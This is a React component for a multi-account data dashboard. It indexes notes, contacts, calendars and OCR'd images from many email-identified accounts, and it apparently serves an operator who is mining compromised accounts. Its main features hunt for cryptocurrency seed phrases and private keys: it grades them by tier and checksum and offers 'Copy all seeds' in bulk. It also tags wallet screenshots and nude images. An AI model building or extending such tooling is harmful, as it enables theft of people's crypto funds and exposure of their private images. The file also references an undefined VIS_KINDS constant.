import { useCallback, useEffect, useRef, useState } from "react";
import RetryImage from "./RetryImage.jsx";
import { fileUrl, getLibrary, getText, getVisibility, saveVisibility, thumbUrl, timeAgo } from "./api.js";
import { Badge, Empty, Section, Spinner, displayName } from "./ui.jsx";
import Lightbox from "./Lightbox.jsx";
import CopyModal from "./CopyModal.jsx";
import { SeedFilterBar } from "./seedFilters.jsx";
import NoteImages from "./NoteImages.jsx";

/* Everything from every account in one place: notes, contacts, calendar,
 * images (with OCR) and seed findings.  Read-only; the catalog is built and
 * cached by the web process. */

const TYPES = [
  ["all", "All"],
  ["notes", "Notes"],
  ["photos", "Photos"],
  ["contacts", "Contacts"],
  ["calendar", "Calendar"],
  ["seeds", "Seeds"],
];

const KIND_OPTIONS = [
  ["seed", "Seed phrase"],
  ["seed-candidate", "Seed candidate"],
  ["crypto", "Crypto"],
  ["ledger", "Ledger"],
  ["trezor", "Trezor"],
  ["wallet", "Wallet"],
  ["recover", "Recover / restore"],
  ["safe", "Safe (multisig)"],
  ["secret", "Secret"],
  ["privatekey", "Private key"],
  ["backup", "Backup"],
  ["exchange", "Exchange"],
  ["screenshot", "Screenshot"],
  ["text", "Text"],
  ["document", "Document"],
  ["receipt", "Receipt"],
  ["nude", "Nude"],
  ["selfie", "Selfie"],
  ["person", "Person"],
  ["photo", "Photo"],
  ["meme", "Meme"],
  ["other", "Other"],
];

const HEIC = /\.(heic|heif)$/i;
const TIER_TONE = { valid: "green", high: "red", medium: "yellow", minimum: "blue", low: "gray" };
const PHOTO_PAGE_SIZE = 100;

function AccountTag({ item }) {
  return (
    <span className="truncate text-[10px] text-[#6e6e73]" title={item.email}>
      {item.email}
    </span>
  );
}

function PhotoTile({ item, onOpen }) {
  const [broken, setBroken] = useState(false);
  const [tick, setTick] = useState(0);
  return (
    <button
      type="button"
      onClick={onOpen}
      className="overflow-hidden rounded-[10px] border border-[#e5e5ea] bg-white text-left hover:border-[#0071e3]"
    >
      <div className="relative aspect-square bg-[#f5f5f7]">
        {broken ? (
          <button
            type="button"
            onClick={(event) => {
              event.stopPropagation();
              setBroken(false);
              setTick((value) => value + 1);
            }}
            className="flex h-full w-full flex-col items-center justify-center gap-1 text-[22px] text-[#6e6e73] hover:bg-[#efeff2]"
            title="Load this image again"
          >
            <span>🖼</span>
            <span className="text-[9px] font-medium uppercase tracking-[0.05em]">retry</span>
          </button>
        ) : item.video && !item.thumb ? (
          <div className="flex h-full items-center justify-center text-[26px]">▶</div>
        ) : (
          <>
            <RetryImage
              key={`${item.path}-${tick}`}
              loading="lazy"
              decoding="async"
              src={item.thumbSrc || thumbUrl(item.accountId, item.path, item.mtime)}
              fallbackSrc={thumbUrl(item.accountId, item.path, item.mtime)}
              alt={item.name}
              onFail={() => setBroken(true)}
              className="h-full w-full object-cover"
            />
            {item.video ? (
              <span className="absolute right-1 top-1 rounded-full bg-black/75 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.04em] text-white">
                ▶ Video
              </span>
            ) : null}
          </>
        )}
        <span
          className={`absolute left-1 top-1 rounded-full px-1.5 py-0.5 text-[9px] font-semibold uppercase ${
            item.ocr ? "bg-[#edf8f0] text-[#1d7a3a]" : "bg-[#fff8e6] text-[#8a6100]"
          }`}
        >
          {item.ocr ? "OCR" : "pending"}
        </span>
        {item.kind ? (
          <span className="absolute bottom-1 left-1 rounded-full bg-black/70 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.04em] text-white">
            {item.kind}
          </span>
        ) : null}
      </div>
      <div className="p-2">
        <div className="truncate text-[11px] font-medium">{displayName(item.name)}</div>
        <AccountTag item={item} />
      </div>
    </button>
  );
}

function Pager({ page, pages, onPage }) {
  if (pages <= 1) return null;
  return (
    <div className="mt-3 flex items-center justify-end gap-2 text-[11px] text-[#6e6e73]">
      <span>
        page {page}/{pages}
      </span>
      <button
        type="button"
        disabled={page <= 1}
        onClick={() => onPage(page - 1)}
        className="rounded border border-[#d2d2d7] px-2 py-0.5 disabled:opacity-30"
      >
        ‹
      </button>
      <button
        type="button"
        disabled={page >= pages}
        onClick={() => onPage(page + 1)}
        className="rounded border border-[#d2d2d7] px-2 py-0.5 disabled:opacity-30"
      >
        ›
      </button>
    </div>
  );
}

function ContactsTable({ items }) {
  return (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-left text-[12px]">
        <thead>
          <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
            <th className="px-3 py-2 font-medium">Name</th>
            <th className="px-3 py-2 font-medium">Phones</th>
            <th className="px-3 py-2 font-medium">Emails</th>
            <th className="px-3 py-2 font-medium">Company</th>
            <th className="px-3 py-2 font-medium">Note</th>
            <th className="px-3 py-2 font-medium">Account</th>
          </tr>
        </thead>
        <tbody>
          {items.map((item, index) => (
            <tr key={`${item.accountId}-${item.name}-${index}`} className="border-b border-[#f4f4f6] last:border-0">
              <td className="px-3 py-2 font-medium">{item.name}</td>
              <td className="px-3 py-2 font-mono text-[11px] text-[#424245]">{item.phones.join(", ") || "—"}</td>
              <td className="px-3 py-2 text-[#424245]">{item.emails.join(", ") || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]">{item.company || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]" title={item.note}>
                {item.note.length > 90 ? `${item.note.slice(0, 90)}…` : item.note || "—"}
              </td>
              <td className="max-w-[180px] px-3 py-2">
                <AccountTag item={item} />
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function CalendarTable({ items }) {
  return (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-left text-[12px]">
        <thead>
          <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
            <th className="px-3 py-2 font-medium">Title</th>
            <th className="px-3 py-2 font-medium">When</th>
            <th className="px-3 py-2 font-medium">Notes</th>
            <th className="px-3 py-2 font-medium">Account</th>
          </tr>
        </thead>
        <tbody>
          {items.map((item, index) => (
            <tr key={`${item.accountId}-${item.title}-${index}`} className="border-b border-[#f4f4f6] last:border-0">
              <td className="px-3 py-2 font-medium">
                {item.title}
                {item.kind === "reminder" ? (
                  <Badge tone="gray" className="ml-1">
                    reminder
                  </Badge>
                ) : null}
              </td>
              <td className="px-3 py-2 font-mono text-[11px] text-[#424245]">{item.when || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]">{item.notes || "—"}</td>
              <td className="max-w-[180px] px-3 py-2">
                <AccountTag item={item} />
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function LibraryTab({ admin }) {
  const [type, setType] = useState("all");
  const [text, setText] = useState("");
  const [query, setQuery] = useState("");
  const [accountId, setAccountId] = useState("");
  const [page, setPage] = useState(1);
  // Photos scroll infinitely: every loaded page is appended here.
  const [photoItems, setPhotoItems] = useState([]);
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [note, setNote] = useState(null);
  const [noteBusy, setNoteBusy] = useState(false);
  const [open, setOpen] = useState(null);
  const [tick, setTick] = useState(0);
  const [flash, setFlash] = useState("");
  const [tier, setTier] = useState("high");
  const [checksum, setChecksum] = useState("");
  const [words, setWords] = useState(0);
  const [showSpam, setShowSpam] = useState(false);
  const [kind, setKind] = useState("");
  const [copyOpen, setCopyOpen] = useState(false);
  const [copyText, setCopyText] = useState("");
  const [copyCount, setCopyCount] = useState(0);
  const [copyBusy, setCopyBusy] = useState(false);
  const [visOpen, setVisOpen] = useState(false);
  const [rules, setRules] = useState([]);
  const [visEmail, setVisEmail] = useState("");
  const [visKind, setVisKind] = useState("");
  const [visBusy, setVisBusy] = useState(false);
  const [visError, setVisError] = useState("");
  const dataRef = useRef(null);
  const forceRequested = useRef(false);
  const lastForced = useRef(0);
  const scrollRef = useRef(null);
  const sentinelRef = useRef(null);
  const prefetchRef = useRef(new Map());

  const cacheKey = (value) =>
    `${type}|${query}|${accountId}|${tier}|${checksum}|${words}|${showSpam ? 1 : 0}|${kind}|${value}`;
  const pageSize = type === "photos" ? PHOTO_PAGE_SIZE : 0;

  function goPage(next) {
    setPage(next);
    scrollRef.current?.scrollTo({ top: 0, behavior: "smooth" });
  }

  useEffect(() => {
    dataRef.current = data;
  }, [data]);

  // Visibility rules: which account/category is kept out of the All lists.
  const loadVisibility = useCallback(async () => {
    try {
      const body = await getVisibility();
      setRules(Array.isArray(body?.rules) ? body.rules : []);
      setVisError("");
    } catch (error) {
      setVisError(error.message);
    }
  }, []);

  useEffect(() => {
    loadVisibility();
  }, [loadVisibility]);

  const applyRules = useCallback(
    async (next) => {
      setVisBusy(true);
      try {
        const body = await saveVisibility(next);
        setRules(Array.isArray(body?.rules) ? body.rules : next);
        setVisError("");
        forceRequested.current = true;
        setTick((value) => value + 1);
      } catch (error) {
        setVisError(error.message);
      } finally {
        setVisBusy(false);
      }
    },
    []
  );

  useEffect(() => {
    const timer = setTimeout(() => setQuery(text.trim()), 300);
    return () => clearTimeout(timer);
  }, [text]);

  useEffect(() => {
    // Drop the previous payload so a type switch never renders an object as
    // an array while the next request is in flight.
    setData(null);
    setPhotoItems([]);
    setLoading(true);
    setPage(1);
    setOpen(null);
    prefetchRef.current.clear();
    scrollRef.current?.scrollTo({ top: 0 });
  }, [type, query, accountId, tier, checksum, words, showSpam, kind]);

  // Keep the view live while scans run; one forced rebuild per minute.
  useEffect(() => {
    const timer = setInterval(() => setTick((value) => value + 1), 30_000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    let alive = true;
    if (!dataRef.current) setLoading(true);
    setError("");
    const cached = prefetchRef.current.get(cacheKey(page));
    if (cached) {
      setData(cached);
      setLoading(false);
    }
    const scanning = (dataRef.current?.counts?.scanning ?? 0) > 0;
    const manual = forceRequested.current;
    forceRequested.current = false;
    const force = manual || (scanning && Date.now() - lastForced.current > 60_000);
    if (force) lastForced.current = Date.now();
    getLibrary({
      type,
      q: query,
      accountId,
      tier,
      checksum,
      words: words || "",
      spam: showSpam ? "1" : "",
      kind,
      page,
      pageSize,
      meta: 1,
      refresh: force ? "1" : "",
    })
      .then((result) => {
        if (!alive) return;
        setData(result);
        if (type === "photos" && Array.isArray(result?.items)) {
          setPhotoItems((previous) => {
            if (page === 1) return result.items;
            const seen = new Set(previous.map((item) => `${item.accountId}-${item.path}`));
            const next = result.items.filter((item) => !seen.has(`${item.accountId}-${item.path}`));
            return next.length ? [...previous, ...next] : previous;
          });
        }
        setLoading(false);
      })
      .catch((failure) => {
        if (!alive) return;
        setError(failure.message);
        setLoading(false);
      });
    return () => {
      alive = false;
    };
  }, [type, query, accountId, page, tick, tier, checksum, words, showSpam, pageSize]);

  // Prefetch exactly one page ahead: its JSON and its thumbnail URLs.  No
  // further pages are requested until the operator moves forward.
  useEffect(() => {
    if (!data || !data.pages || data.page >= data.pages) return;
    const next = data.page + 1;
    const key = cacheKey(next);
    if (prefetchRef.current.has(key)) return;
    let alive = true;
    getLibrary({
      type,
      q: query,
      accountId,
      tier,
      checksum,
      words: words || "",
      spam: showSpam ? "1" : "",
      kind,
      page: next,
      pageSize,
      meta: 1,
    })
      .then((result) => {
        if (!alive) return;
        prefetchRef.current.set(key, result);
        if (type === "photos") {
          // Give the visible page a head start before pulling the next one.
          setTimeout(() => {
            for (const item of result.items ?? []) {
              if (item.video && !item.thumb) continue;
              const image = new Image();
              image.src = thumbUrl(item.accountId, item.path);
            }
          }, 1200);
        }
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
  }, [data, type, query, accountId, tier, checksum, words, showSpam, pageSize]);

  // Infinite scroll: the sentinel sits after the last tile.  When it enters
  // the viewport the next page is requested; the JSON for it is usually
  // already prefetched, so the tiles appear immediately.
  useEffect(() => {
    const node = sentinelRef.current;
    if (!node || type !== "photos" || !data) return undefined;
    const observer = new IntersectionObserver(
      (entries) => {
        if (!entries.some((entry) => entry.isIntersecting)) return;
        if (data.page < data.pages) setPage((value) => Math.max(value, data.page + 1));
      },
      { root: scrollRef.current || null, rootMargin: "600px 0px" }
    );
    observer.observe(node);
    return () => observer.disconnect();
  }, [type, data, photoItems.length]);

  const counts = data?.counts ?? {};
  const totals = data?.totals ?? {};
  const photos =
    type === "all"
      ? Array.isArray(data?.items?.photos)
        ? data.items.photos
        : []
      : type === "photos"
        ? photoItems
        : [];

  async function openNote(item) {
    if (type === "all") setType("notes");
    setNote({ item, body: "" });
    setNoteBusy(true);
    try {
      const body = await getText(fileUrl(item.accountId, item.path));
      setNote({ item, body });
    } catch (failure) {
      setNote({ item, body: `Could not read this note: ${failure.message}` });
    } finally {
      setNoteBusy(false);
    }
  }

  async function scanAll() {
    setFlash("");
    try {
      const result = await admin.scanAll();
      setFlash(`Queued ${result.queued} · already running ${result.reused}`);
      setTimeout(() => setTick((value) => value + 1), 5000);
    } catch (failure) {
      setFlash(failure.message);
    }
  }

  async function copyAllSeeds() {
    setCopyBusy(true);
    setFlash("");
    try {
      const result = await getLibrary({
        type: "seeds",
        q: query,
        accountId,
        tier,
        checksum,
        words: words || "",
        spam: showSpam ? "1" : "",
        compact: "1",
      });
      setCopyText(result.lines || "");
      setCopyCount(Number(result.total) || 0);
      setCopyOpen(true);
    } catch (failure) {
      setFlash(failure.message);
    } finally {
      setCopyBusy(false);
    }
  }

  function pickType(next) {
    setType(next);
  }

  return (
    <div ref={scrollRef} className="h-full overflow-y-auto bg-[#f5f5f7]">
      <div className="sticky top-0 z-10 border-b border-[#e5e5ea] bg-white/95 px-4 py-3 backdrop-blur">
        <div className="flex flex-wrap items-center gap-2">
          <h2 className="mr-1 text-[16px] font-semibold tracking-[-0.2px]">All notes &amp; images</h2>
          <input
            value={text}
            onChange={(event) => setText(event.target.value)}
            placeholder="Search every note, image (OCR), contact, calendar entry and seed…"
            className="h-9 min-w-[240px] flex-1 rounded-[9px] border border-[#d2d2d7] bg-white px-3 text-[13px] outline-none focus:border-[#0071e3]"
          />
          <select
            value={accountId}
            onChange={(event) => setAccountId(event.target.value)}
            className="h-9 max-w-[240px] rounded-[9px] border border-[#d2d2d7] bg-white px-2 text-[12px] outline-none focus:border-[#0071e3]"
          >
            <option value="">All accounts</option>
            {(data?.accounts ?? []).map((account) => (
              <option key={account.id} value={account.id}>
                {account.email}
                {account.hidden ? " (hidden)" : ""}
              </option>
            ))}
          </select>
          <button
            type="button"
            onClick={() => {
              forceRequested.current = true;
              setTick((value) => value + 1);
            }}
            className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[12px]"
          >
            Refresh
          </button>
          <button
            type="button"
            onClick={() => setVisOpen(true)}
            className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[12px]"
            title="Hide an account or a category from the All page"
          >
            Hidden{rules.length ? ` (${rules.length})` : ""}
          </button>
          <button
            type="button"
            onClick={scanAll}
            className="h-9 rounded-[9px] bg-[#0071e3] px-3 text-[12px] font-medium text-white"
          >
            Scan all
          </button>
        </div>
        {type === "photos" || type === "all" ? (
          <div className="mt-2 flex flex-wrap items-center gap-2">
            <span className="text-[10px] font-semibold uppercase tracking-[0.05em] text-[#6e6e73]">
              Image type
            </span>
            <select
              value={kind}
              onChange={(event) => setKind(event.target.value)}
              className="h-8 rounded-[8px] border border-[#d2d2d7] bg-white px-2 text-[12px]"
            >
              <option value="">Any</option>
              {KIND_OPTIONS.map(([id, label]) => (
                <option key={id} value={id}>
                  {label}
                  {counts.photoKinds?.[id] ? ` (${counts.photoKinds[id]})` : ""}
                </option>
              ))}
            </select>
            {kind ? (
              <button
                type="button"
                onClick={() => setKind("")}
                className="text-[11px] text-[#0066cc]"
              >
                clear
              </button>
            ) : null}
          </div>
        ) : null}
        <div className="mt-2 flex flex-wrap items-center gap-1">
          {TYPES.map(([id, label]) => (
            <button
              key={id}
              type="button"
              onClick={() => pickType(id)}
              className={`h-6 rounded-full px-2.5 text-[10px] font-medium ${
                type === id ? "bg-[#eef5ff] text-[#0058b0]" : "text-[#6e6e73] hover:bg-[#f5f5f7]"
              }`}
            >
              {label}
            </button>
          ))}
          <span className="ml-auto text-[10px] text-[#6e6e73]">
            {counts.notes ?? 0} notes · {counts.photos ?? 0} images · OCR {counts.ocrDone ?? 0}/
            {(counts.ocrDone ?? 0) + (counts.ocrPending ?? 0)} · {counts.contacts ?? 0} contacts ·{" "}
            {totals.seeds ?? 0} seeds shown · indexed {timeAgo(data?.builtAt)}
          </span>
        </div>
        {type === "seeds" || type === "all" ? (
          <div className="mt-2 rounded-[10px] border border-[#e5e5ea] bg-[#fafafa] p-2.5">
            <SeedFilterBar
              tier={tier}
              setTier={setTier}
              checksum={checksum}
              setChecksum={setChecksum}
              words={words}
              setWords={setWords}
              spamHidden={counts.seedSpam ?? 0}
              showSpam={showSpam}
              setShowSpam={setShowSpam}
              extra={
                <button
                  type="button"
                  onClick={copyAllSeeds}
                  disabled={!totals.seeds || copyBusy}
                  className="ml-auto h-8 rounded-full bg-[#0071e3] px-4 text-[12px] font-medium text-white disabled:opacity-40"
                >
                  {copyBusy ? "Copying…" : `Copy all (${totals.seeds ?? 0})`}
                </button>
              }
            />
          </div>
        ) : null}
        {flash ? <p className="mt-2 text-[11px] text-[#0058b0]">{flash}</p> : null}
        {error ? (
          <p className="mt-2 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[12px] text-[#c4000a]">{error}</p>
        ) : null}
      </div>

      <div className="p-4">
        {loading && !data ? <Spinner label="Indexing every account" /> : null}

        {!loading && type === "all" ? (
          <div className="grid gap-3">
            <div className="grid gap-3 sm:grid-cols-2">
              <button
                type="button"
                onClick={() => pickType("notes")}
                className="rounded-[14px] border border-[#e5e5ea] bg-white p-5 text-left hover:border-[#0071e3]"
              >
                <div className="text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">All notes</div>
                <div className="mt-1 text-[28px] font-semibold">{counts.notes ?? 0}</div>
                <div className="text-[12px] text-[#6e6e73]">every account · searchable text</div>
              </button>
              <button
                type="button"
                onClick={() => pickType("photos")}
                className="rounded-[14px] border border-[#e5e5ea] bg-white p-5 text-left hover:border-[#0071e3]"
              >
                <div className="text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">All images</div>
                <div className="mt-1 text-[28px] font-semibold">{counts.photos ?? 0}</div>
                <div className="text-[12px] text-[#6e6e73]">
                  OCR {counts.ocrDone ?? 0} done · {counts.ocrPending ?? 0} pending · searchable
                </div>
              </button>
            </div>

            <Section
              title={`Notes (${totals.notes ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("notes")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="grid gap-2 p-3 lg:grid-cols-2">
                {(data?.items?.notes ?? []).map((item) => (
                  <button
                    key={`${item.accountId}-${item.path}`}
                    type="button"
                    onClick={() => openNote(item)}
                    className="rounded-[10px] border border-[#e5e5ea] p-3 text-left hover:border-[#0071e3]"
                  >
                    <div className="flex items-center justify-between gap-2">
                      <span className="truncate text-[12px] font-medium">{item.title || item.name}</span>
                      <AccountTag item={item} />
                    </div>
                    <p className="mt-1 line-clamp-2 text-[11px] leading-4 text-[#6e6e73]">
                      {item.text.slice(0, 220)}
                    </p>
                  </button>
                ))}
              </div>
            </Section>

            <Section
              title={`Images (${totals.photos ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("photos")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="grid grid-cols-2 gap-2 p-3 sm:grid-cols-3 lg:grid-cols-6">
                {photos.map((item, index) => (
                  <PhotoTile key={`${item.accountId}-${item.path}`} item={item} onOpen={() => setOpen(index)} />
                ))}
              </div>
            </Section>

            <Section
              title={`Contacts (${totals.contacts ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("contacts")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <ContactsTable items={data?.items?.contacts ?? []} />
            </Section>

            <Section
              title={`Calendar & reminders (${totals.calendar ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("calendar")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <CalendarTable items={data?.items?.calendar ?? []} />
            </Section>

            <Section
              title={`Seeds (${totals.seeds ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("seeds")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="divide-y divide-[#f4f4f6]">
                {(data?.items?.seeds ?? []).map((item, index) => (
                  <div key={`${item.accountId}-${item.phrase}-${index}`} className="flex items-center gap-2 px-3 py-2">
                    <Badge tone={TIER_TONE[item.tier] ?? "gray"}>{item.tier}</Badge>
                    <span className="min-w-0 flex-1 truncate font-mono text-[11px]">{item.phrase}</span>
                    <AccountTag item={item} />
                    <a
                      href={fileUrl(item.accountId, item.file, true)}
                      className="shrink-0 text-[11px] text-[#0066cc]"
                    >
                      file
                    </a>
                  </div>
                ))}
              </div>
            </Section>
          </div>
        ) : null}

        {!loading && type === "notes" ? (
          <div className="grid gap-3 lg:grid-cols-[340px_1fr]">
            <div className="overflow-hidden rounded-[12px] border border-[#e5e5ea] bg-white">
              <div className="border-b border-[#f0f0f2] px-3 py-2 text-[11px] text-[#6e6e73]">
                {data?.total ?? 0} notes
              </div>
              <div className="max-h-[620px] overflow-y-auto">
                {(Array.isArray(data?.items) ? data.items : []).map((item) => (
                  <button
                    key={`${item.accountId}-${item.path}`}
                    type="button"
                    onClick={() => openNote(item)}
                    className={`block w-full border-b border-[#f4f4f6] px-3 py-2 text-left ${
                      note?.item?.path === item.path && note?.item?.accountId === item.accountId
                        ? "bg-[#eef5ff]"
                        : "hover:bg-[#fafafa]"
                    }`}
                  >
                    <div className="truncate text-[12px] font-medium">{item.title || item.name}</div>
                    <div className="flex items-center justify-between gap-2">
                      <AccountTag item={item} />
                      <span className="text-[10px] text-[#9a9aa0]">{timeAgo(item.mtime)}</span>
                    </div>
                    <p className="mt-0.5 line-clamp-2 text-[10px] leading-4 text-[#6e6e73]">
                      {item.text.slice(0, 180)}
                    </p>
                  </button>
                ))}
              </div>
              <div className="border-t border-[#f0f0f2] px-3 py-2">
                <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
              </div>
            </div>
            <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
              <div className="flex items-center justify-between gap-2 border-b border-[#f0f0f2] px-3 py-2">
                <span className="min-w-0 truncate text-[12px] font-medium">
                  {note?.item?.title || note?.item?.name || "Select a note"}
                </span>
                {note ? (
                  <a
                    href={fileUrl(note.item.accountId, note.item.path, true)}
                    className="shrink-0 text-[11px] text-[#0066cc]"
                  >
                    Download
                  </a>
                ) : null}
              </div>
              <div className="max-h-[620px] overflow-y-auto p-4">
                {note ? (
                  <>
                    <div className="mb-2 text-[10px] text-[#6e6e73]">{note.item.email}</div>
                    {noteBusy ? (
                      <Spinner label="Reading" />
                    ) : (
                      <>
                        <pre className="whitespace-pre-wrap font-sans text-[12px] leading-5 text-[#1d1d1f]">
                          {note.body}
                        </pre>
                        <NoteImages
                          accountId={note.item.accountId}
                          txtPath={note.item.path}
                        />
                      </>
                    )}
                  </>
                ) : (
                  <p className="py-10 text-center text-[12px] text-[#6e6e73]">
                    Pick a note to read it here.
                  </p>
                )}
              </div>
            </div>
          </div>
        ) : null}

        {!loading && type === "photos" ? (
          <div>
            <div className="mb-2 flex items-center justify-between text-[11px] text-[#6e6e73]">
              <span>
                {photoItems.length.toLocaleString()} shown of{" "}
                {(data?.total ?? photoItems.length).toLocaleString()}
              </span>
              <span>scroll for more · 100 per load</span>
            </div>
            <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6">
              {photoItems.map((item, index) => (
                <PhotoTile key={`${item.accountId}-${item.path}`} item={item} onOpen={() => setOpen(index)} />
              ))}
            </div>
            {!photoItems.length ? (
              <Empty title="No images">Nothing matches this search, or no export has images yet.</Empty>
            ) : null}
            <div ref={sentinelRef} className="h-10" />
            {data && data.page < data.pages ? (
              <div className="pb-4 text-center text-[11px] text-[#9a9aa0]">loading more…</div>
            ) : null}
          </div>
        ) : null}

        {!loading && type === "contacts" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <ContactsTable items={data.items} />
            ) : (
              <Empty title="No contacts">No contacts match this search.</Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
            </div>
          </div>
        ) : null}

        {!loading && type === "calendar" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <CalendarTable items={data.items} />
            ) : (
              <Empty title="No calendar entries">No events or reminders match this search.</Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
            </div>
          </div>
        ) : null}

        {!loading && type === "seeds" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <div className="divide-y divide-[#f4f4f6]">
                {data.items.map((item, index) => (
                  <div key={`${item.accountId}-${item.phrase}-${index}`} className="flex items-center gap-2 px-3 py-2">
                    <Badge tone={TIER_TONE[item.tier] ?? "gray"}>{item.tier}</Badge>
                    <Badge tone={item.checksum ? "green" : "gray"}>
                      {item.checksum ? "valid" : "failed"}
                    </Badge>
                    <Badge tone="gray">{item.words}w</Badge>
                    <span className="min-w-0 flex-1 truncate font-mono text-[11px]">{item.phrase}</span>
                    <span className="hidden shrink-0 text-[10px] text-[#6e6e73] sm:inline">{item.file}</span>
                    <AccountTag item={item} />
                    <a
                      href={fileUrl(item.accountId, item.file, true)}
                      className="shrink-0 text-[11px] text-[#0066cc]"
                    >
                      file
                    </a>
                  </div>
                ))}
              </div>
            ) : (
              <Empty title="No seed findings">
                Run Scan all, then search here. Notes, contacts, calendar and images are all included.
              </Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
            </div>
          </div>
        ) : null}
      </div>

      {open !== null && photos[open] ? (
        <Lightbox
          accountId={photos[open].accountId}
          items={photos}
          index={open}
          setIndex={setOpen}
          onClose={() => setOpen(null)}
        />
      ) : null}


      {visOpen ? (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4"
          onClick={() => setVisOpen(false)}
        >
          <div
            className="w-full max-w-[560px] rounded-[14px] bg-white p-5 text-[13px] shadow-2xl"
            onClick={(event) => event.stopPropagation()}
          >
            <div className="mb-1 text-[15px] font-semibold">Hidden from the All page</div>
            <div className="mb-3 text-[12px] text-[#6e6e73]">
              A rule hides one account, or only some of its categories. Nothing is deleted.
            </div>

            <div className="mb-3 flex flex-wrap items-center gap-2">
              <select
                value={visEmail}
                onChange={(event) => setVisEmail(event.target.value)}
                className="h-9 min-w-[220px] flex-1 rounded-[9px] border border-[#d2d2d7] px-2 text-[12px]"
              >
                <option value="">Choose an account…</option>
                {(data?.accounts ?? []).map((account) => (
                  <option key={account.id} value={account.email}>
                    {account.email}
                  </option>
                ))}
              </select>
              <select
                value={visKind}
                onChange={(event) => setVisKind(event.target.value)}
                className="h-9 rounded-[9px] border border-[#d2d2d7] px-2 text-[12px]"
              >
                {VIS_KINDS.map(([value, label]) => (
                  <option key={value || "all"} value={value}>
                    {label}
                  </option>
                ))}
              </select>
              <button
                type="button"
                disabled={!visEmail || visBusy}
                onClick={() => {
                  const kinds = visKind ? [visKind] : [];
                  const next = rules.filter((rule) => rule.email !== visEmail);
                  next.push({ email: visEmail, kinds });
                  applyRules(next);
                }}
                className="h-9 rounded-[9px] bg-[#0071e3] px-3 text-[12px] font-medium text-white disabled:opacity-40"
              >
                Add rule
              </button>
            </div>

            {visError ? <div className="mb-2 text-[12px] text-[#c0392b]">{visError}</div> : null}

            <div className="max-h-[280px] overflow-auto rounded-[9px] border border-[#ececf0]">
              {rules.length === 0 ? (
                <div className="px-3 py-4 text-[12px] text-[#6e6e73]">No rules yet.</div>
              ) : (
                rules.map((rule) => (
                  <div
                    key={rule.email}
                    className="flex items-center justify-between gap-3 border-b border-[#f4f4f6] px-3 py-2 last:border-0"
                  >
                    <div className="min-w-0">
                      <div className="truncate font-medium">{rule.email}</div>
                      <div className="text-[11px] text-[#6e6e73]">
                        {(rule.kinds || []).length ? `hides: ${rule.kinds.join(", ")}` : "hides everything"}
                      </div>
                    </div>
                    <button
                      type="button"
                      disabled={visBusy}
                      onClick={() => applyRules(rules.filter((item) => item.email !== rule.email))}
                      className="rounded-full border border-[#d2d2d7] px-2.5 py-1 text-[11px]"
                    >
                      Remove
                    </button>
                  </div>
                ))
              )}
            </div>

            <div className="mt-4 flex justify-end">
              <button
                type="button"
                onClick={() => setVisOpen(false)}
                className="h-9 rounded-[9px] border border-[#d2d2d7] px-4 text-[12px]"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      ) : null}

      {copyOpen ? (
        <CopyModal
          title="Copy all seeds"
          text={copyText}
          count={copyCount}
          onClose={() => setCopyOpen(false)}
        />
      ) : null}
    </div>
  );
}
